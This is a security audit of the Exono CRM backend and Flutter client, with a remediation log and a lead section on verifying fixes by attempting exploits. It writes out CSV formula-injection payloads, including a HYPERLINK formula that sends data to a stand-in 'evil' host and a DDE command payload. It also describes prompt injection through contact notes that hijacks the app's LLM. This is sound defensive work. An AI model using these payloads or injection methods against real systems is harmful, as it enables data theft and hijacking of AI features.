# READ FIRST — Remediation framework (how to fix a finding like an attacker)

> **This section is mandatory for any LLM or engineer about to remediate a finding in this document.** Read it before touching code. It exists because on 2026-06-24 a "fix" that compiled cleanly and read correctly nonetheless *introduced* a live cross-tenant read+write hole (finding **B12**), which was caught only because the fix was attacked, not reasoned about. Fixing security is not the same as writing correct code. Adopt the mindset below.

## Prime directive: a vulnerability is not fixed until you have failed to exploit it

You do not get to *declare* something fixed. You get to *try to break it and fail*. "I added a check / the types pass / I read the code and it looks right" is **not** evidence — it is a hypothesis. The only evidence is an exploit attempt that is now blocked, run against something as close to production as you can reach. Security controls fail **silently** (RLS returns 0 rows; an auth check short-circuits; a filter quietly matches nothing) — so the absence of an error proves nothing. Prove the *negative*: the attack that worked before now returns blocked/empty/403, and the legitimate path still works.

## Think like the attacker, not the author

The author asks "does my change do what I intended?" The attacker asks "what does this change let me do that you didn't intend?" Always take the second view. For every fix, enumerate concretely:
- **Who is the adversary?** Usually a second authenticated tenant (User B) targeting User A. Sometimes `anon`, sometimes a malicious value in attacker-controlled data (an imported contact's `notes`, a filename, a JWT claim).
- **What do they know?** Assume they know resource UUIDs (IDOR), can read your client code, can craft arbitrary request bodies/headers/params, and can call any route in any order. Never rely on a value being "hard to guess" or "not exposed in the UI."
- **What is the crown-jewel action?** Cross-tenant *read* is bad; cross-tenant *write* is worse; privilege escalation / auth bypass is worst. Test the worst case, not just the obvious one.

## The remediation loop (run this for every finding)

1. **Reproduce the exploit first.** Before changing anything, demonstrate the hole as the attacker (DB role impersonation, or a real HTTP call as User B). If you cannot reproduce it, you do not understand it well enough to fix it — and you won't be able to prove the fix.
2. **Find the root cause, not the symptom.** Patching one route leaves the same class open in the next. Prefer *structural* fixes that make the whole class impossible (e.g. RLS enforcing tenancy in the database) over per-handler filters that drift. When you do a structural fix, see step 4 — structural changes have structural side effects.
3. **Apply the minimal correct change.** Don't expand blast radius. Preserve legitimate behaviour. Keep deliberate exceptions explicit and justified (e.g. a `service_role`/admin path) so the next reader doesn't mistake intent for oversight.
4. **Hunt for what the fix *activates or shifts*.** This is the step that catches B12-class bugs. Changing the enforcement layer can wake dormant misconfigurations:
   - Moving off a bypass-everything client (`service_role`/admin) **activates every previously-dormant RLS policy** — any permissive `USING(true)` policy granted to `public`/`anon`/`authenticated` becomes a live, table-wide hole the instant the scoped client touches that table.
   - Adding `WITH CHECK` makes inserts that omit the ownership column start *failing* (functional break, also worth catching).
   - Tightening one route can push attackers to a sibling route that shares the resource. Check siblings.
5. **Re-test: exploit blocked AND happy path intact.** Run the original exploit again — it must now fail. Then run the legitimate flow end-to-end — it must still succeed. Both halves are required; a fix that also breaks real usage is not done.
6. **Sweep for the whole class.** One instance found usually means siblings exist. After the fix, query/grep for the *pattern*, not the single case (see the standing checks below), and confirm the sweep comes back clean.
7. **Document honestly in this file.** Mark exactly what is fixed (with how it was verified), what the fix newly uncovered, and what remains open. **Never mark something fixed that you only reasoned about.** "Read-scoping is not write protection" — be precise about the boundary of what you actually closed.

## Verification techniques that actually prove things (Supabase/Postgres + Express)

- **DB-level tenant impersonation (fastest, most reliable for RLS):**
  ```sql
  begin;
  set local role authenticated;
  set local request.jwt.claims = '{"sub":"<VICTIM-or-ATTACKER-uuid>","role":"authenticated"}';
  -- now attempt the cross-tenant SELECT / UPDATE / INSERT and observe row counts / RLS errors
  rollback;
  ```
  This runs the exact policy stack the user client runs. A successful cross-tenant `UPDATE ... RETURNING` is a confirmed write hole; `new row violates row-level security policy` is a confirmed block.
- **Live HTTP pen-test:** mint two real JWTs (create confirmed users via the admin API, then log in through the app's own `/auth/login`), and replay the attack as User B against User A's resource over real routes. This catches route-layer issues RLS-only testing misses (wrong client used, missing middleware, error-status leaks).
- **Standing sweeps after any access-control / RLS change — all must return empty:**
  - No permissive backdoor policy reachable by user roles:
    ```sql
    select tablename, policyname from pg_policies
    where schemaname='public' and (qual='true' or with_check='true')
      and ('public'=any(roles::text[]) or 'anon'=any(roles::text[]) or 'authenticated'=any(roles::text[]))
      and 'slayer_readonly' <> all(roles::text[]);
    ```
  - No tenant table left RLS-enabled-but-not-forced (owner bypasses RLS):
    ```sql
    select relname from pg_class c join pg_namespace n on n.oid=c.relnamespace
    where n.nspname='public' and c.relkind='r' and c.relrowsecurity and not c.relforcerowsecurity;
    ```
  - No route still on the bypass client where it shouldn't be: `grep -rln "config/supabase'" backend/src/routes` should list only the deliberately-admin files.
- **Always clean up test artifacts** (throwaway users + their rows) and stop any server you started.

## Non-negotiables

- Don't weaken a control to make a test pass. Don't disable RLS "temporarily." Don't broaden a CORS/policy/scope to unblock a flow — fix the flow.
- Confirm before destructive or outward-facing actions; production DDL and data changes are real.
- Report faithfully: if you didn't run the HTTP test, say so; if a step was skipped, say so; if something is only *partially* fixed, label the exact residue. An overstated "fixed" is worse than an honest "open" because it stops anyone from looking again.

---

# Cybersecurity Audit — Exono CRM

**Scope:** Flutter client (`exono/`) + Express/Supabase backend (`backend/`)
**Standards:** **OWASP Top 10:2025** (web/API, released Jan 2026), OWASP API Security Top 10:2023 (no 2025 edition exists yet), OWASP Mobile Top 10:2024 (latest mobile edition; separate release cycle).
**Date:** 2026-06-24
**Status:** Partial remediation applied 2026-06-24 — the backend was migrated off the `service_role` client onto an RLS-enforced per-request user client. See **"Remediation applied — RLS migration"** below for what is now fixed, what was newly discovered during the fix, and what remains open.

> **Severity legend:** 🔴 Critical · 🟠 High · 🟡 Medium · 🟢 Good practice / informational

## OWASP Top 10:2025 — taxonomy used in this report

The web/API findings below are mapped to the current 2025 list (note the reshuffle vs 2021):

| 2025 ID | Category | Notable change from 2021 |
|---|---|---|
| A01:2025 | Broken Access Control | Still #1; **SSRF now folded in here** |
| A02:2025 | Security Misconfiguration | Up from #5 → #2 |
| A03:2025 | **Software Supply Chain Failures** | **New** (expands old "Vulnerable & Outdated Components") |
| A04:2025 | Cryptographic Failures | Down #2 → #4 |
| A05:2025 | Injection | Down #3 → #5 |
| A06:2025 | Insecure Design | — |
| A07:2025 | Authentication Failures | — |
| A08:2025 | Software or Data Integrity Failures | — |
| A09:2025 | Security Logging and Alerting Failures | Renamed; now includes alerting |
| A10:2025 | **Mishandling of Exceptional Conditions** | **New** — error handling, failing open, logic errors |

Mobile-client findings keep the OWASP **Mobile Top 10:2024** IDs (Mxx), which is the current and separately-maintained mobile list.

Sources: [OWASP Top 10:2025](https://owasp.org/Top10/2025/) · [Introduction](https://owasp.org/Top10/2025/0x00_2025-Introduction/) · [OWASP API Security Top 10](https://owasp.org/API-Security/) · [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/)

---

## Architectural context (read first)

The single most important fact for the whole backend: **every route except `conversations`/`messages` uses the Supabase `service_role` client**, which **bypasses Row-Level Security entirely**.

- [backend/src/config/supabase.ts:4](backend/src/config/supabase.ts#L4) exports `supabase = supabaseAdmin` (service_role).
- All 16 tables have `rls_enabled: true`, but RLS protects almost nothing because service_role ignores it.
- Authorization is therefore enforced **only** by hand-written `.eq('user_id', ...)` filters in each route handler. Every route that forgets one is a direct cross-tenant data-exposure bug (**A01:2025 Broken Access Control**).
- The correct pattern exists in `conversations.ts`, which uses `createSupabaseUserClient(accessToken)` ([backend/src/config/supabaseClients.ts:51](backend/src/config/supabaseClients.ts#L51)) so RLS *is* enforced. The rest of the codebase should follow this model.

> **This architecture has now been changed — see the next section.** As of 2026-06-24 the route layer no longer relies on the `service_role` client for tenant data; it uses a per-request RLS-enforced user client, so the "one forgotten `.eq('user_id')` = data leak" failure mode is structurally closed for the migrated routes.

---

# Remediation applied — RLS migration (2026-06-24)

The backend was migrated so Postgres **Row-Level Security is the enforcement layer**, not hand-written filters. This was done in two halves: database policies first, then the route layer. **Every change below was empirically penetration-tested** by impersonating a second real tenant at the database level (`SET ROLE authenticated` + forged `request.jwt.claims`) and attempting cross-tenant reads and writes against live data — not merely reasoned about.

## What was changed

**Route layer (`backend/`):**
- `requireAuth` ([middleware/requireAuth.ts](backend/src/middleware/requireAuth.ts)) now sets `req.supabase = createSupabaseUserClient(accessToken)` — an RLS-enforced client running as the `authenticated` role. Typed in [types/express.d.ts](backend/src/types/express.d.ts).
- 13 route files migrated to `req.supabase`: `events`, `contacts`, `captures`, `emails`, `sync`, `import`, `export`, `dashboard`, `ai`, `followUps`, `attachments`, `documents`, `interactions`. Each handler binds `const supabase = req.supabase!;`; ownership-helper functions (`ownsContact`, `ownsInteraction`) now take the client as a parameter.
- **Intentionally left on `service_role`** (now imported explicitly as `supabaseAdmin`): `companies.ts` (shared-reference pool, no `user_id` — see open item below), `auth.ts` (auth flows, not tenant data), `assistant.ts` (AI agent with its own `.eq('user_id')` ownership + `stripImmutable` mass-assignment guard — verified), and `conversations.ts` (storage only; data already on the user client).
- **B6 mass-assignment fixed:** `PUT /follow-ups/:id` ([followUps.ts](backend/src/routes/followUps.ts)) now validates the body with a strict allowlist Zod schema (`followUpUpdateSchema`, `.strict()`), so `contact_id`/`event_id`/`user_id`/`id` can no longer be re-pointed.

**Database (project `ezammzqvbjgpuzleqmla`):**
- Added full-CRUD `authenticated`-role RLS policies (`user_id = (select auth.uid())`) to `events`, `interactions`, `captures`, `email_drafts`, `event_goals`, `target_companies`, `contact_events` — these previously had only a SELECT-only `sync_select_own` policy, so the user client could not have written to them.
- Added **join-based** policies for the three tables with no `user_id` column: `attachments` (owned via its `interaction`/`email_draft`), `contact_documents` (via its `contact`), and `companies` (SELECT-only, via a linked owned `contact` or `target_company`).
- Forced RLS (`ALTER TABLE ... FORCE ROW LEVEL SECURITY`) on `events`, `captures`, `contact_events`, `event_goals`, `conversations`, `messages`, `message_attachments`, `assistant_rate_limits` — they were RLS-enabled but not forced, meaning the table owner bypassed RLS (defense-in-depth gap).

## Vulnerability the migration itself uncovered — now fixed 🔴→🟢

### B12. `contact_events` `{public}` allow-all policy — cross-tenant read AND write — A01:2025
- A pre-existing policy `service_role_all` on `contact_events` targeted role `{public}` with `USING (true) WITH CHECK (true)`. It was **dormant** while routes used `service_role` (which bypasses RLS and never evaluates policies).
- Because Postgres RLS policies are **PERMISSIVE (OR-combined)**, the instant `contact_events` access moved to the `authenticated` user client, this `USING(true)` policy **OR-opened the entire table to every authenticated user**. Penetration test confirmed: as tenant B, I read **and UPDATE-ed** tenant A's `contact_events` row.
- **Fix:** `DROP POLICY service_role_all` — `service_role` never needed it, and the own-scoped `contact_events_{select,insert,update,delete}_own` policies provide correct access. Re-tested: cross-tenant read/write now returns 0 rows / RLS error.
- **Lesson:** migrating off `service_role` does not just *add* enforcement — it *activates* every previously-dormant permissive policy. Any `USING(true)` policy granted to `public`/`anon`/`authenticated` becomes a live hole at migration time. The post-migration sweep `SELECT ... FROM pg_policies WHERE (qual='true' OR with_check='true') AND role ∈ {public,anon,authenticated}` must return empty (verified empty as of 2026-06-24).

## Penetration-test results (cross-tenant, two real tenants)

| Attack as tenant B against tenant A | Before fix | After fix |
|---|---|---|
| Read A's contacts/events/interactions/captures/email_drafts/goals/targets | blocked | ✅ blocked (0 rows) |
| Read A's `contact_events` | 🔴 1 row leaked | ✅ blocked (0 rows) |
| **Update** A's `contact_events` row | 🔴 succeeded | ✅ blocked |
| Insert `contact_document` onto A's contact (UUID known) | n/a | ✅ blocked — `new row violates RLS policy` |
| Read `companies` | global pool | ✅ scoped to linked subset (17 of 36) |

## Still open after this migration (NOT fixed — do not assume closed)

- **B2 — `companies` write authorization remains wide open.** `POST /companies` and `PATCH /companies/:id` ([companies.ts:217](backend/src/routes/companies.ts#L217), [:238](backend/src/routes/companies.ts#L238)) still run as `service_role` with **no ownership/linkage check**. The RLS migration scoped company *reads* (a user sees only linked companies) but **writes are unaffected** — any authenticated user can still modify/poison any company record (which can then reach another tenant's AI briefing, cf. B7). This needs a deliberate decision: shared-reference table with a controlled write path, or per-tenant `user_id` scoping. **Read-scoping is not write protection.**
- **RLS-INSERT requires `user_id` to be set by the app.** Under `WITH CHECK (user_id = auth.uid())`, any INSERT that omits `user_id` now *fails* (previously `service_role` allowed it). The migrated INSERT paths set `user_id` explicitly; this is a behavioural change to watch for in any new code.
- **No runtime/integration test was run** against a live HTTP session. RLS denials are silent (0 rows), so the main flows (create event, scan contact, follow-up send, document upload) should be smoke-tested end-to-end before relying on this in production. The DB changes are additive (service_role paths are unaffected), so existing behaviour is preserved; the risk is a migrated route that needed a policy I did not add.
- All non-A01 findings below (B3 deps, B4 error leakage, B7 prompt injection, B8 CORS, B9–B11, H1–H2, and all client C-findings) are **untouched** by this migration.

---

# Backend findings

## 🔴 Critical

### B1. Broken Object-Level Authorization (IDOR / BOLA) — **A01:2025** · API1:2023 — ✅ **FIXED 2026-06-24 (RLS migration) + route guard added 2026-06-25**
> Update 2026-06-25: contacts.ts already used `req.supabase` (RLS), so timeline was structurally closed; a `router.param('id', …)` ownership guard ([contacts.ts](backend/src/routes/contacts.ts)) was added mirroring events.ts so every `/contacts/:id/*` route now also returns 403/404 at the route layer (defense-in-depth, explicit intent). **HTTP pen-tested:** `GET /contacts/:id/timeline` as tenant B vs A → 404 (guard fires before handler); happy path as A → 200 with own rows. R-01 closed.
>
> The `GET /contacts/:id/timeline` IDOR is now closed **structurally**: `contacts.ts` uses the RLS-enforced user client, so the `interactions`/`captures` reads return only the caller's own rows regardless of the `contact_id` supplied — an attacker passing a victim's contact UUID gets 0 rows. The broader class is also closed: penetration-tested cross-tenant reads on contacts/interactions/captures/etc. all return 0. See "Remediation applied" above. (`events.ts` was already protected by `router.param('id')`.)

Multiple endpoints accept an `:id` from the URL and query by it as service_role **without verifying the resource belongs to the caller**.

| Endpoint | Location | Problem |
|---|---|---|
| `GET /contacts/:id/timeline` | [contacts.ts:358](backend/src/routes/contacts.ts#L358) | Reads `interactions` + `captures` by `contact_id` with **no ownership check** (service_role client). Any authenticated user can read any contact's full interaction history, free-text notes, and capture image URLs by enumerating IDs. Sibling routes `/:id/insights` and `/:id/events` *do* check ownership; `/timeline` does not. **Confirmed exploitable (re-verified 2026-06-24).** |
| ~~`GET /events/:id/stats`~~ | [events.ts:549](backend/src/routes/events.ts#L549) | **Mitigated** — see note below. |
| ~~`GET /events/:id/targets`~~ | [events.ts:625](backend/src/routes/events.ts#L625) | **Mitigated** — see note below. |
| ~~`GET /events/:id/live`~~ | [events.ts:662](backend/src/routes/events.ts#L662) | **Mitigated** — see note below. |
| ~~`GET /events/:id/goals`~~ | [events.ts:789](backend/src/routes/events.ts#L789) | **Mitigated** — see note below. |
| ~~`POST /events/:id/ask`~~ | [events.ts:800](backend/src/routes/events.ts#L800) | **Mitigated** — see note below. |

> **Update (2026-06-24): the `events.ts` `:id` routes are now protected.** [events.ts:69-90](backend/src/routes/events.ts#L69-L90) defines a `router.param('id', ...)` middleware that loads the event and returns `403` when `event.user_id !== req.user!.id`. Because Express runs `router.param` for **every** route containing an `:id` segment, all event sub-resource routes above (`/stats`, `/targets`, `/live`, `/goals`, `/ask`) inherit the ownership check. These are no longer exploitable. **`GET /contacts/:id/timeline` remains vulnerable** because `contacts.ts` has no equivalent `router.param('id')` guard — it is the one confirmed-open IDOR in this class.

**Contrast — the correct pattern in the same files:** `GET /events/:id` ([events.ts:73-82](backend/src/routes/events.ts#L73-L82)) checks `event.user_id !== req.user!.id → 403`, and the new `router.param('id')` generalizes it; `attachments.ts` has an `ownsContact()` guard ([attachments.ts:6](backend/src/routes/attachments.ts#L6)). The protection is applied inconsistently across files (events is now covered, contacts/timeline is not) — that inconsistency is the vulnerability.

**Fix:** add an ownership precheck (load parent `event`/`contact`, verify `user_id === req.user.id`, else 403) at the top of every `:id` sub-resource handler — or migrate these routes to `createSupabaseUserClient` so RLS enforces tenancy structurally. The latter is the robust fix; hand-filters keep drifting.

---

## 🟠 High

### B2. `companies` table has no tenant scoping — **A01:2025** · API1/API3:2023
[backend/src/routes/companies.ts](backend/src/routes/companies.ts) — there is no `user_id` column anywhere on `companies`. Read, search, enrich, AI-briefing, and create all operate on a single global pool. Beyond IDOR, one user can poison shared company records (e.g. inject content that later lands in another tenant's AI briefing).
**Decision required:** shared-reference table (make it read-only to users; writes via a controlled path) vs. per-tenant (add `user_id` + filter everywhere).

### B3. Vulnerable / outdated dependencies — **A03:2025 Software Supply Chain Failures** (new category)
`npm audit --omit=dev` on `backend/` reports **15 vulnerabilities (6 moderate, 9 high)**. Confirmed high-severity ones:
- **`ws` 8.0.0–8.20.1** — uninitialized memory disclosure ([GHSA-58qx-3vcg-4xpx](https://github.com/advisories/GHSA-58qx-3vcg-4xpx)) + memory-exhaustion DoS ([GHSA-96hv-2xvq-fx4p](https://github.com/advisories/GHSA-96hv-2xvq-fx4p)). **Fix available** via `npm audit fix`.
- **`ws`** — ✅ **FIXED 2026-06-25** via `npm audit fix`; transitive bump applied, `ws` advisories cleared (audit went 15 → 3 vulns).
- **`xlsx` / SheetJS** — ⚠️ **STILL OPEN** — Prototype Pollution ([GHSA-4r6h-8v6p-xvw6](https://github.com/advisories/GHSA-4r6h-8v6p-xvw6)) + ReDoS ([GHSA-5pgg-2g8v-p4x9](https://github.com/advisories/GHSA-5pgg-2g8v-p4x9)). **No npm fix** (`npm audit fix` cannot resolve it). Requires pinning the patched SheetJS CDN build or migrating the import parser to `exceljs` (already a dependency) — a deliberate code change, not done here. Directly reachable via the import path (B10).

**Fix:** run `npm audit fix` for `ws`; for `xlsx`, pin to the patched SheetJS build from their own CDN (the npm registry copy is unmaintained) or replace with a maintained parser (e.g. `exceljs`), and sanitize parsed objects against prototype pollution. Add `npm audit` / Dependabot to CI so supply-chain drift is caught (A03 is now a top-3 risk). `package-lock.json` is committed (good — deps are pinned).

### B4. Server error messages leaked to client — **A10:2025 Mishandling of Exceptional Conditions** · A02:2025 — ✅ **FIXED 2026-06-25**
> [backend/src/middleware/errorHandler.ts](backend/src/middleware/errorHandler.ts) now returns a generic `"Internal server error"` plus a random `correlationId` on every 500; the underlying `err.message`/`err.stack` are exposed only when `NODE_ENV === 'development'` and are always logged server-side keyed by the correlation ID. The 500 handler no longer leaks Postgres/Supabase internals. **HTTP-verified** (`NODE_ENV=production`): an error path returned a clean `{"error":"Contact not found"}` with no stack/internals.
>
> **Residue (still open):** a class-grep found **31** route handlers that still do `res.status(4xx).json({ error: error.message })`, echoing Supabase error text on 4xx (validation/constraint names, not stacks). Lower impact than the 500 leak but not swept — a real remaining item.

### B5. Cross-tenant write via unscoped `contactId` — **A01:2025** · API1:2023 — ✅ **FIXED 2026-06-24 (RLS migration)**
> `events.ts` now uses the RLS-enforced user client. The `contacts` UPDATE and `email_drafts` INSERT in `PATCH /events/:id/follow-ups/:contactId` are now constrained by RLS `WITH CHECK`/`USING (user_id = auth.uid())`, so a foreign `contactId` cannot be written even though the handler still lacks an inline `user_id` filter — RLS rejects it. Penetration-tested: cross-tenant writes blocked.

**Original finding (now mitigated):** **Confirmed (2026-06-24)**
[backend/src/routes/events.ts:1135](backend/src/routes/events.ts#L1135) — `PATCH /events/:id/follow-ups/:contactId`. The event `:id` is ownership-checked by the `router.param('id')` middleware (see B1), **but `contactId` is not**. The handler runs `supabase.from('contacts').update({...}).eq('id', contactId)` (service_role) with **no `user_id` filter** (the send/skip/unskip branches all do this), and inserts `email_drafts` rows referencing the foreign `contactId`.
**Attack:** an attacker passes one of their *own* event IDs (passes the param check) plus a *victim's* `contactId`, and flips that victim's `follow_up_status` / `last_contacted_at`, or creates draft rows against the foreign contact.
**Fix:** add `.eq('user_id', req.user!.id)` to every `contacts` update in this handler, and verify the contact is owned by the caller before any write.

### B6. Mass-assignment in follow-up update — **A01:2025 / Insecure Design (A06)** — ✅ **FIXED 2026-06-24**
> `PUT /follow-ups/:id` ([followUps.ts](backend/src/routes/followUps.ts)) now validates the body with a strict allowlist schema (`followUpUpdateSchema` using Zod `.strict()`), exposing only `summary`/`details`/`interaction_type`/`interaction_date`. `contact_id`, `event_id`, `user_id`, and `id` can no longer be mass-assigned. (Belt-and-suspenders: the route is also on the RLS user client now, so a re-point to a foreign contact would additionally be blocked by RLS.)

**Original finding (now fixed):** **Confirmed (2026-06-24)**
[backend/src/routes/followUps.ts:159](backend/src/routes/followUps.ts#L159) — `PUT /follow-ups/:id` checks `ownsInteraction(...)` then runs `supabase.from('interactions').update(req.body).eq('id', id)` (service_role). The **entire request body is spread into the update with no allowlist / Zod schema**, unlike [interactions.ts:99](backend/src/routes/interactions.ts#L99) which validates with `interactionPatchSchema`.
**Attack:** an attacker who owns interaction X sends `PUT /follow-ups/X` with `{"contact_id":"<victim-contact>"}` (or `user_id` / `event_id`), re-pointing the row to another tenant's data or corrupting ownership columns.
**Fix:** validate the body with a strict allowlist Zod schema exposing only the mutable follow-up fields, as `interactions.ts` already does.

### B7. Prompt injection via LLM endpoints — **A05:2025 Injection** (LLM01)
`POST /events/:id/ask` ([events.ts:800](backend/src/routes/events.ts#L800)), `GET /contacts/:id/insights` ([contacts.ts:454](backend/src/routes/contacts.ts#L454)), `/assistant/respond`, and company briefings concatenate user/DB-controlled strings (contact notes, company descriptions, the `question` field, Tavily web results) directly into prompts. Untrusted contact `notes` / company `description` (attacker-controllable via import) can hijack the model's instructions or exfiltrate other context. Combined with B1, AI-mediated cross-tenant data reads are realistic.
**Fix:** delimit and label untrusted content, instruct the model to treat it as data, and never let one tenant's free text reach another tenant's prompt (fix B1 first).

---

## 🟡 Medium

### B8. CORS fails open when `ALLOWED_ORIGINS` unset — **A10:2025 (failing open)** · A02:2025 — ✅ **FIXED 2026-06-25**
> [backend/src/server.ts](backend/src/server.ts) now fails **closed** in production: when `NODE_ENV === 'production'` and `ALLOWED_ORIGINS` is empty, browser-origin requests are denied (a startup warning is logged). The empty-allowlist "allow all" path is now gated to non-production only. No-origin requests (mobile/curl) are still allowed by design. `credentials: true` no longer combines with a wildcard origin in prod. **Verification note:** the server was run with `NODE_ENV=production` + a set `ALLOWED_ORIGINS` during pen-testing (so the happy path was exercised), but the *empty-allowlist-denies* branch was reviewed in code, not directly HTTP-exercised — worth a one-line curl check (`Origin:` header, empty `ALLOWED_ORIGINS`) before relying on it.

### B9. `pgrst_reload_schema` is a public/authenticated SECURITY DEFINER RPC — **A02:2025 Security Misconfiguration**
`public.pgrst_reload_schema()` is callable by `anon` and `authenticated` via `/rest/v1/rpc/...` as `SECURITY DEFINER` with a mutable `search_path`. Any client with the anon key can trigger schema reloads.
Remediation: <https://supabase.com/docs/guides/database/database-linter?lint=0028_anon_security_definer_function_executable> — `REVOKE EXECUTE ... FROM anon, authenticated`.

### B10. File upload has no validation; avatar bucket lists publicly — **A02:2025** · A05:2025
- [backend/src/routes/upload.ts](backend/src/routes/upload.ts) accepts any file into memory and returns a placeholder URL with **no MIME/size/extension validation** (currently a stub — ensure it isn't relied on in prod).
- Supabase advisor: public bucket **`contact-avatars` allows listing all files** — anyone can enumerate every uploaded avatar. Remediation: <https://supabase.com/docs/guides/database/database-linter?lint=0025_public_bucket_allows_listing>. Tighten the bucket SELECT policy to object-URL access only.
- CSV/Excel import ([backend/src/routes/import.ts](backend/src/routes/import.ts)) — verify formula-injection sanitization and row caps; note it runs through the vulnerable `xlsx` parser (B3).

### B11. No rate limiting; no abuse logging/alerting; leaked-password protection disabled — **A07:2025 Authentication Failures** · **A09:2025 Security Logging and Alerting Failures**
- No `express-rate-limit` anywhere. `/auth/login` and `/auth/signup` are open to credential stuffing / brute force; expensive AI/Tavily endpoints are open to cost-abuse (A07).
- There is request logging ([middleware/logger.ts](backend/src/middleware/logger.ts)) but **no security alerting** on repeated auth failures or anomalous access — A09:2025 explicitly elevates alerting, not just logging.
- Supabase advisor: **leaked-password protection (HaveIBeenPwned) is disabled** — enable it: <https://supabase.com/docs/guides/auth/password-security>.

---

# Security headers & baseline posture (reviewed 2026-06-24)

Focused review of HTTP response headers and deployment hardening. **Overall: the API backend's header baseline is good; the served web frontend has none.**

## 🟢 API backend headers — solid baseline (no change needed)
[backend/src/server.ts:21](backend/src/server.ts#L21) uses `app.use(helmet())` with **helmet 8.2.0** ([package.json](backend/package.json)) and no overrides. Helmet 8 defaults set a strong set of headers on every API response:
- `Content-Security-Policy: default-src 'self'; base-uri 'self'; font-src 'self' https: data:; form-action 'self'; frame-ancestors 'self'; img-src 'self' data:; object-src 'none'; script-src 'self'; script-src-attr 'none'; style-src 'self' https: 'unsafe-inline'; upgrade-insecure-requests`
- `Strict-Transport-Security: max-age=...; includeSubDomains`
- `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN` + CSP `frame-ancestors 'self'`
- `Referrer-Policy: no-referrer`, `Cross-Origin-Opener-Policy: same-origin`, `Origin-Agent-Cluster: ?1`, `X-DNS-Prefetch-Control`, `X-Download-Options`, `X-Permitted-Cross-Domain-Policies`

This is an API that returns JSON, so CSP/frame headers matter less here than on the HTML frontend — but the baseline is correct. Vercel also terminates TLS and adds HSTS at the edge, so transport is covered. **No action required on the API headers** beyond the CORS fail-open already tracked in B8.

## 🟠 H1. Served web frontend has NO security headers — **A02:2025 Security Misconfiguration** — ✅ **FIXED 2026-06-25 (needs deploy verification)**
> The web app is hosted on **Firebase Hosting** (not Vercel), so headers were added via a `hosting.headers` block in [exono/firebase.json](exono/firebase.json) (matched on `source: "**"`): HSTS (preload), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` (camera/mic `self`), and a Flutter-web-tuned CSP (`script-src 'self' 'wasm-unsafe-eval'`, `worker-src 'self' blob:`, `connect-src` for the API + Supabase + googleapis + firebaseio/firebaseapp, `frame-ancestors 'none'`). **Not yet verified against a live deploy** — re-deploy (`firebase deploy --only hosting`), confirm the Flutter web app still loads (wasm + drift worker, Firebase SDK calls) and tighten `connect-src` to the real runtime origins before relying on it.

### H1 (original)
The Flutter **web** build is served as static HTML/JS (`exono/web/index.html`, `manifest.json`, wasm) — verified the app deploys to `exhibitioncrm.vercel.app`. There is **no `vercel.json` / `_headers` file for the frontend** (the only [backend/vercel.json](backend/vercel.json) has no `headers` block, and it builds the API, not the web app). The HTML app therefore ships with **no CSP, no HSTS, no X-Frame-Options, no X-Content-Type-Options, no Referrer-Policy**. helmet does not help here — it only runs on the API, not on the static frontend.
**Impact:** the actual user-facing origin (where any DOM-XSS, clickjacking, or MIME-sniffing would land) is the unprotected one. Clickjacking and missing CSP are live on the page that renders CRM data.
**Fix:** add a `vercel.json` (or `web/_headers`) for the frontend deployment with at minimum:
```json
{
  "headers": [{
    "source": "/(.*)",
    "headers": [
      { "key": "Strict-Transport-Security", "value": "max-age=63072000; includeSubDomains; preload" },
      { "key": "X-Content-Type-Options", "value": "nosniff" },
      { "key": "X-Frame-Options", "value": "DENY" },
      { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
      { "key": "Permissions-Policy", "value": "camera=(self), microphone=(self), geolocation=()" },
      { "key": "Content-Security-Policy", "value": "default-src 'self'; img-src 'self' data: https:; connect-src 'self' https://exhibitioncrm.vercel.app https://*.supabase.co; object-src 'none'; base-uri 'self'; frame-ancestors 'none'" }
    ]
  }]
}
```
Tune `script-src`/`connect-src`/`worker-src` for Flutter web's wasm + drift worker (`'wasm-unsafe-eval'` and `worker-src 'self' blob:` are typically required). Note `camera`/`microphone` are `self` because the app uses card-scan + voice capture.

## 🟡 H2. CSV export formula injection (CSV/Excel injection) — **A05:2025 Injection** — ✅ **FIXED 2026-06-25**
> [backend/src/routes/export.ts](backend/src/routes/export.ts) `/csv` now (1) wraps every field in double quotes with embedded quotes doubled (RFC-4180), so commas/newlines can't break out of a cell, and (2) prefixes any field starting with `= + - @` or a leading tab/CR with a single quote so spreadsheet apps treat it as text. Rows are joined with `\r\n`. **HTTP-verified:** a contact named `=HYPERLINK("http://evil")` exported as `"'=HYPERLINK(""http://evil"")"` (formula neutralized, quotes doubled); a name `a,b` exported as `"a,b"` (no column breakout). **Note:** `/export/excel` (the `exceljs`/`xlsx` path) was not changed here — verify its sheet writer applies the same formula guard.

### H2 (original)
[backend/src/routes/export.ts:62-71](backend/src/routes/export.ts#L62-L71) builds the export with `r.join(',')` — **no field quoting and no formula-prefix neutralization**. Exported fields (`first_name`, `last_name`, `job_title`, `company`, etc.) are user-controlled: the write schema ([contacts.ts:11](backend/src/routes/contacts.ts#L11)) only trims/length-limits `first_name`, so a value like `=HYPERLINK("http://evil/?"&A1,"click")` or `=cmd|'/c calc'!A0` is stored verbatim and emitted into the CSV.
**Impact:** when the victim opens the exported `contacts.csv` in Excel/Sheets, the cell executes as a formula — data exfiltration (HYPERLINK/WEBSERVICE) or, with legacy DDE, command execution. Also, a name containing `,` or a newline corrupts/injects CSV columns since fields are unquoted.
**Fix:** (1) wrap every field in double quotes and escape embedded quotes (`"" `), and (2) prefix any field beginning with `= + - @` (or tab/CR) with a single quote `'` before export. Better: use a CSV library (`csv-stringify`) configured to quote all fields, plus the formula-guard step.

---

# Client (Flutter) findings — OWASP Mobile Top 10:2024

## 🔴 Critical

### C1. Auth tokens stored in plaintext (`SharedPreferences`) — M9: Insecure Data Storage · M1: Improper Credential Usage
[auth_provider.dart:110-111](exono/lib/providers/auth_provider.dart#L110-L111), [api_service.dart:30-31](exono/lib/services/api_service.dart#L30-L31)
`access_token` and `refresh_token` are written to unencrypted `SharedPreferences` (Android XML / iOS plist). Recoverable on rooted/jailbroken devices or via backup extraction. The refresh token grants long-lived account takeover.
**Fix:** use `flutter_secure_storage` (Keychain / Android Keystore-backed EncryptedSharedPreferences) for both tokens.

### C2. Local offline database is unencrypted — M9: Insecure Data Storage
